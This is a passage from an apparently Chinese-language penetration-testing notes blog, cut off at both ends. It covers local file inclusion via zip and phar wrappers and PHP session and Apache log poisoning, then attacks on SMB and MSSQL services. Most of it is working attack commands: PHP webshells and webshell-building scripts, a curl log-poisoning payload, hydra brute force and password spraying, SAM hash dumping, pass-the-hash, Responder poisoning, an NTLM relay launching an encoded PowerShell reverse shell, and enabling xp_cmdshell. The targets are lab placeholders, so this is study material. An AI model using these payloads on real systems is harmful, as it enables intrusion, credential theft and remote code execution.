&amp;&amp; zip shell.jpg shell.php</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>尽管将 zip 存档命名为（shell.jpg），但某些上传表单仍可能通过内容类型测试将文件检测为 zip 存档并禁止其上传，因此，如果允许上传 zip 存档，则此攻击成功的可能性更高。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?point=zip://./images/shell.jpg%23shell.php&amp;0=id</span><br></pre></td></tr></table></figure><h3 id="Phar"><a href="#Phar" class="headerlink" title="Phar"></a>Phar</h3><p>webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$phar = new Phar(&#x27;shell.phar&#x27;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(&#x27;shell.txt&#x27;, &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;);</span><br><span class="line">$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p><code>phar.readonly = 0</code> 时，允许 PHP 创建和修改 phar 文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg</span><br></pre></td></tr></table></figure><p>将上传的文件包含到 LFI 漏洞中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?point=phar://./images/shell.jpg%2Fshell.txt&amp;0=id</span><br></pre></td></tr></table></figure><h2 id="Log-Poisoning"><a href="#Log-Poisoning" class="headerlink" title="Log Poisoning"></a>Log Poisoning</h2><table><thead><tr><th>功能</th><th>阅读内容</th><th>执行</th><th>远程 URL</th></tr></thead><tbody><tr><td><strong>PHP</strong></td><td></td><td></td><td></td></tr><tr><td><code>include()</code>&#x2F;<code>include_once()</code></td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td><code>require()</code>&#x2F;<code>require_once()</code></td><td>✅</td><td>✅</td><td>❌</td></tr><tr><td><strong>NodeJS</strong></td><td></td><td></td><td></td></tr><tr><td><code>res.render()</code></td><td>✅</td><td>✅</td><td>❌</td></tr><tr><td><strong>Java</strong></td><td></td><td></td><td></td></tr><tr><td><code>import</code></td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td><strong>.NET</strong></td><td></td><td></td><td></td></tr><tr><td><code>include</code></td><td>✅</td><td>✅</td><td>✅</td></tr></tbody></table><h3 id="PHP-Session-Poisoning"><a href="#PHP-Session-Poisoning" class="headerlink" title="PHP Session Poisoning"></a>PHP Session Poisoning</h3><p><code>PHPSESSID Cookie</code>，它可以在后端保存与用户相关的特定数据，存储在<code>session</code>后端的文件中，在 Linux 上保存在<code>/var/lib/php/sessions/</code> ，在Windows 上保存在<code>C:\Windows\Temp\</code>，文件前缀<code>sess_</code>。</p><p>查看当前 PHPSESSID Cookie，补全文件名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sessions/sess_*</span><br></pre></td></tr></table></figure><p>查看页面元素显示情况并分析记录了哪些数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?point=/var/lib/php/sessions/sess_5u2us8k88igoc7ca1veic27or7</span><br><span class="line"></span><br><span class="line"># sess_5u2us8k88igoc7ca1veic27or7</span><br><span class="line">selected_language|s:6:&quot;en.php&quot;;preference|s:7:&quot;English&quot;;            </span><br></pre></td></tr></table></figure><p>针对出现的页面元素进行测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?point=&lt;?php%20system($_GET[0]);?&gt;</span><br><span class="line"></span><br><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?point=/var/lib/php/sessions/sess_5u2us8k88igoc7ca1veic27or7&amp;0=id</span><br></pre></td></tr></table></figure><blockquote><p>注意：要执行另一个命令，必须再次使用 Web Shell 毒害会话文件，文件会被覆盖。</p></blockquote><h3 id="Server-Log-Poisoning"><a href="#Server-Log-Poisoning" class="headerlink" title="Server Log Poisoning"></a>Server Log Poisoning</h3><p><code>Apache</code>和都<code>Nginx</code>维护各种日志文件，例如<code>access.log</code>和<code>error.log</code>。<code>access.log</code>文件包含有关对服务器发出的所有请求的各种信息，包括每个请求的<code>User-Agent</code>标头。</p><p><code>Nginx</code>默认情况下，日志可由低权限用户读取（例如<code>www-data</code>），而<code>Apache</code>日志仅可由具有高权限的用户读取（例如<code>root</code>&#x2F;<code>adm</code>组）。但是，在较旧或配置错误的<code>Apache</code>服务器中，这些日志可能可由低权限用户读取。</p><p>默认日志存储位置</p><table><thead><tr><th>Server</th><th>Linux</th><th>Windows</th></tr></thead><tbody><tr><td>Apache</td><td><code>/var/log/apache2/</code></td><td><code>C:\xampp\apache\logs\</code></td></tr><tr><td>Nginx</td><td><code>/var/log/nginx/</code></td><td><code>C:\nginx\log\</code></td></tr></tbody></table><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><p>User-Agent 请求毒害</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s &#x27;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?point=/var/log/apache2/access.log&amp;0=id&#x27; -A &#x27;&lt;?php system($_GET[0]);?&gt;&#x27;</span><br></pre></td></tr></table></figure><p>还可以观察记录了哪些日志，再利用。</p><p><code>/etc/apache2/envvars</code>文件中的变量<code>APACHE_LOG_DIR</code>，记录了<code>/access.log</code>和<code>/error.log</code> 的位置。</p><blockquote><p><strong>提示：</strong> Linux 目录下的进程文件<code>/proc/</code>上也显示了<code>User-Agent</code>标头。因此，可以尝试包括<code>/proc/self/environ</code>或<code>/proc/self/fd/N</code>文件（其中 N 是通常在 0-50 之间的 PID），并且可能能够对这些文件执行相同的攻击。</p><p>如果没有对服务器日志的读取权限，这可能会很方便。但是，这些文件也可能只有特权用户才能读取。</p></blockquote><h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4><ul><li><code>/var/log/sshd.log</code></li><li><code>/var/log/mail</code></li><li><code>/var/log/vsftpd.log</code></li></ul><p>首先尝试通过 LFI 读取这些日志，如果确实可以访问它们，可以尝试毒害它们。例如，如果<code>ssh</code>或<code>ftp</code>服务暴露给，并且可以通过 LFI 读取它们的日志，那么可以尝试登录它们并将用户名设置为 PHP 代码，在包含它们的日志后，PHP 代码就会执行。服务也是如此<code>mail</code>，因为可以发送包含 PHP 代码的电子邮件，在包含其日志后，PHP 代码就会执行。可以将这种技术推广到任何记录控制的参数的日志，并且可以通过 LFI 漏洞读取这些日志。</p><h2 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h2><p>配置文件路径字典： <a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux">LFI-WordList-Linux</a>或<a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows">LFI-WordList-Windows</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># payload</span><br><span class="line">ffuf -w /path/to/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u &#x27;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?point=FUZZ&#x27;</span><br><span class="line"></span><br><span class="line"># webroot</span><br><span class="line">ffuf -w /path/to/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u &#x27;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?point=../../../../FUZZ/index.php&#x27;</span><br><span class="line"></span><br><span class="line"># configfile</span><br><span class="line">ffuf -w /path/to/LFI-WordList-Linux:FUZZ -u &#x27;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?point=../../../../FUZZ&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web-Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Attacking Common Services</title>
      <link href="/2024/10/07/pentest/service/Attacking%20Common%20Services/"/>
      <url>/2024/10/07/pentest/service/Attacking%20Common%20Services/</url>
      
        <content type="html"><![CDATA[<h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><p>TCP 445  用于直接通过 TCP&#x2F;IP 传输的 SMB（常见于 SMBv2 和 SMBv3）</p><p>TCP&#x2F;UDP 137-139 用于基于 NetBIOS 的 SMB（通常为 SMBv1）</p><h2 id="Interact"><a href="#Interact" class="headerlink" title="Interact"></a>Interact</h2><h3 id="运行-文件夹"><a href="#运行-文件夹" class="headerlink" title="运行 | 文件夹"></a>运行 | 文件夹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\192.168.220.129\share\</span><br></pre></td></tr></table></figure><h3 id="cmd-powershell"><a href="#cmd-powershell" class="headerlink" title="cmd | powershell"></a>cmd | powershell</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">dir</span> \\192.168.220.129\<span class="title">share</span>\</span></span><br><span class="line"><span class="function"><span class="title">PS</span> <span class="title">C</span>:\&gt; <span class="title">Get</span>-<span class="title">ChildItem</span> \\192.168.220.129\<span class="title">share</span>\</span></span><br></pre></td></tr></table></figure><h3 id="Mount-SMB-CMD"><a href="#Mount-SMB-CMD" class="headerlink" title="Mount SMB - CMD"></a>Mount SMB - CMD</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 连接到文件共享并将其内容映射到驱动器号 n</span><br><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">use</span> <span class="title">n</span>: \\192.168.220.129\<span class="title">share</span> [/<span class="title">user:uname</span> <span class="title">passwd</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 统计文件数量</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">htb</span>&gt; <span class="title">dir</span> <span class="title">n</span>: /<span class="title">a</span>-<span class="title">d</span> /<span class="title">s</span> /<span class="title">b</span> | <span class="title">find</span> /<span class="title">c</span> &quot;:\&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 查找特定文件</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">dir</span> <span class="title">n</span>:\*<span class="title">cred</span>* /<span class="title">s</span> /<span class="title">b</span></span></span><br><span class="line"><span class="function"># <span class="title">or</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">findstr</span> /<span class="title">s</span> /<span class="title">i</span> <span class="title">cred</span> <span class="title">n</span>:\*.*</span></span><br></pre></td></tr></table></figure><h3 id="Mount-SMB-Powershell"><a href="#Mount-SMB-Powershell" class="headerlink" title="Mount SMB - Powershell"></a>Mount SMB - Powershell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">New-PSDrive</span> <span class="literal">-Name</span> <span class="string">&quot;N&quot;</span> <span class="literal">-Root</span> <span class="string">&quot;\\192.168.220.129\share&quot;</span> <span class="literal">-PSProvider</span> <span class="string">&quot;FileSystem&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 凭证输入</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$username</span> = <span class="string">&#x27;uname&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$password</span> = <span class="string">&#x27;passwd&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$secpassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="variable">$password</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$username</span>, <span class="variable">$secpassword</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">New-PSDrive</span> <span class="literal">-Name</span> <span class="string">&quot;N&quot;</span> <span class="literal">-Root</span> <span class="string">&quot;\\192.168.220.129\share&quot;</span> <span class="literal">-PSProvider</span> <span class="string">&quot;FileSystem&quot;</span> <span class="literal">-Credential</span> <span class="variable">$cred</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换驱动器</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; N:</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计文件数量（缩写gci）</span></span><br><span class="line"><span class="built_in">PS</span> N:\&gt; (<span class="built_in">Get-ChildItem</span> <span class="operator">-File</span> <span class="literal">-Recurse</span> | <span class="built_in">Measure-Object</span>).Count</span><br><span class="line"><span class="number">29302</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找特定文件</span></span><br><span class="line"><span class="built_in">PS</span> N:\&gt; <span class="built_in">Get-ChildItem</span> <span class="literal">-Recurse</span> <span class="literal">-Path</span> N:\ <span class="literal">-Include</span> *cred* <span class="operator">-File</span></span><br><span class="line">或</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ChildItem</span> <span class="literal">-Recurse</span> <span class="literal">-Path</span> N:\ | <span class="built_in">Select-String</span> <span class="string">&quot;cred&quot;</span> <span class="literal">-List</span></span><br></pre></td></tr></table></figure><h3 id="Mount-SMB-Linux"><a href="#Mount-SMB-Linux" class="headerlink" title="Mount SMB - Linux"></a>Mount SMB - Linux</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> /mnt/Finance</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> mount -t cifs //192.168.220.129/share /mnt/share -o username=<span class="built_in">uname</span>,password=passwd,domain=.</span> </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用文件凭证</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mount -t cifs //192.168.220.129/share /mnt/share -o credentials=/path/credentialfile</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find /mnt/Finance/ -name *cred*</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">匹配文件内容</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">grep -rn /mnt/Finance/ -ie cred</span></span><br></pre></td></tr></table></figure><p>凭证文件结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=uname</span><br><span class="line">password=passwd</span><br><span class="line">domain=.</span><br></pre></td></tr></table></figure><h2 id="External"><a href="#External" class="headerlink" title="External"></a>External</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap 10.129.14.128 -sV -sC -p139,445</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST</span><br><span class="line">Nmap scan report for 10.129.14.128</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">MAC Address: 00:00:00:00:00:00 (VMware)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: HTB, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-09-19T13:16:04</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure><h3 id="null-session"><a href="#null-session" class="headerlink" title="null session"></a>null session</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L //10.129.14.128</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">枚举每个共享文件夹的权限列表</span></span><br><span class="line">smbmap -H 10.129.14.128</span><br><span class="line">-r [path] 枚举共享文件夹中的所有文件 或 指定共享文件夹</span><br><span class="line">--download &quot;notes\note.txt&quot;</span><br><span class="line">--upload test.txt &quot;notes\test.txt&quot;</span><br></pre></td></tr></table></figure><h3 id="rpc"><a href="#rpc" class="headerlink" title="rpc"></a>rpc</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ rpcclient -U&#x27;%&#x27; 10.10.110.17</span><br><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line"></span><br><span class="line">./enum4linux-ng.py 10.10.11.45 -A -C</span><br></pre></td></tr></table></figure><h3 id="crack"><a href="#crack" class="headerlink" title="crack"></a>crack</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L users.list -P pws.list smb://10.129.220.123</span><br></pre></td></tr></table></figure><h3 id="spraying"><a href="#spraying" class="headerlink" title="spraying"></a>spraying</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p &#x27;Company01!&#x27; --local-auth</span><br><span class="line"># --continue-on-success 找到有效密码后继续喷洒</span><br><span class="line"># --local-auth 本地验证（未加入域使用）</span><br></pre></td></tr></table></figure><h2 id="Internal"><a href="#Internal" class="headerlink" title="Internal"></a>Internal</h2><h3 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec administrator:&#x27;Password123!&#x27;@10.10.110.17</span><br></pre></td></tr></table></figure><h3 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果 --exec-method 没有定义，CrackMapExec 将尝试执行 atexec</span></span><br><span class="line">crackmapexec smb 10.10.110.17 -u Administrator -p &#x27;Password123!&#x27; -x &#x27;whoami&#x27; --exec-method smbexec</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">枚举同一网络内所有机器上的登录用户</span></span><br><span class="line">crackmapexec smb 10.10.110.0/24 -u administrator -p &#x27;Password123!&#x27; --loggedon-users</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SAM数据库提取哈希值</span></span><br><span class="line">crackmapexec smb 10.10.110.17 -u administrator -p &#x27;Password123!&#x27; --sam</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">传递哈希 PTH</span></span><br><span class="line">crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</span><br></pre></td></tr></table></figure><h3 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 网络投毒</span><br><span class="line">sudo responder -I &lt;interface name&gt;</span><br></pre></td></tr></table></figure><p>如果我们无法破解哈希，我们可以使用<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py">impacket-ntlmrelayx</a>或 Responder <a href="https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py">MultiRelay.py</a>将捕获的哈希中继到另一台机器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</span><br><span class="line"></span><br><span class="line"># 反向shell Powershell #3 (Base64)</span><br><span class="line">impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c &#x27;powershell -e &lt;SNIP&gt;&#x27;</span><br></pre></td></tr></table></figure><h1 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h1><p>TCP 1433 UDP 1434 | “hidden” TCP 2433</p><p><code>MSSQL</code>默认系统模式&#x2F;数据库：</p><ul><li><code>master</code>- 保存 SQL Server 实例的信息。</li><li><code>msdb</code>- 由 SQL Server 代理使用。</li><li><code>model</code>- 为每个新数据库复制一个模板数据库。</li><li><code>resource</code>- 一个只读数据库，使系统对象在 sys 模式的服务器上的每个数据库中可见。</li><li><code>tempdb</code>- 为 SQL 查询保留临时对象。</li></ul><h2 id="interact"><a href="#interact" class="headerlink" title="interact"></a>interact</h2><p>如果我们不指定域或主机名，它将假定 SQL 身份验证并针对在 SQL Server 中创建的用户进行身份验证。相反，如果我们定义域或主机名，它将使用 Windows 身份验证。<code>SERVERNAME\\accountname</code>或<code>.\\accountname</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux - sqsh</span></span><br><span class="line">sqsh -S 10.129.20.13 -U username -P Password</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows - sqlcmd</span></span><br><span class="line">C:\&gt; sqlcmd -S 10.129.20.13 -U username -P Password123</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sqlcmd需要在查询后使用GO来执行 SQL 语法。</span></span><br></pre></td></tr></table></figure><h2 id="nmap-1"><a href="#nmap-1" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -Pn -sV -sC -p1433 10.10.10.125</span><br><span class="line"></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked &#x27;up&#x27;, and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST</span><br><span class="line">Nmap scan report for 10.10.10.125</span><br><span class="line">Host is up (0.0099s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   Target_Name: HTB</span><br><span class="line">|   NetBIOS_Domain_Name: HTB</span><br><span class="line">|   NetBIOS_Computer_Name: mssql-test</span><br><span class="line">|   DNS_Domain_Name: HTB.LOCAL</span><br><span class="line">|   DNS_Computer_Name: mssql-test.HTB.LOCAL</span><br><span class="line">|   DNS_Tree_Name: HTB.LOCAL</span><br><span class="line">|_  Product_Version: 10.0.17763</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2021-08-26T01:04:36</span><br><span class="line">|_Not valid after:  2051-08-26T01:04:36</span><br><span class="line">|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s</span><br><span class="line">| ms-sql-info: </span><br><span class="line">|   10.10.10.125:1433: </span><br><span class="line">|     Version: </span><br><span class="line">|       name: Microsoft SQL Server 2017 RTM</span><br><span class="line">|       number: 14.00.1000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2017</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 1433</span><br></pre></td></tr></table></figure><h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接数据库后的命令执行，需要权限，xp_cmdshell默认情况下禁用</span></span><br><span class="line">xp_cmdshell &#x27;whoami&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启，需要权限</span></span><br><span class="line">-- To allow advanced options to be changed.  </span><br><span class="line">EXECUTE sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- To update the currently configured value for advanced options.  </span><br><span class="line">RECONFIGURE</span><br><span class="line">GO  </span><br><span class="line"></span><br><span class="line">-- To enable the feature.  </span><br><span class="line">EXECUTE sp_configure &#x27;xp_cmdshell&#x27;, 1</span><br><span class="line">GO  </span><br><span class="line"></span><br><span class="line">-- To update the currently configured value for this feature.  </span><br><span 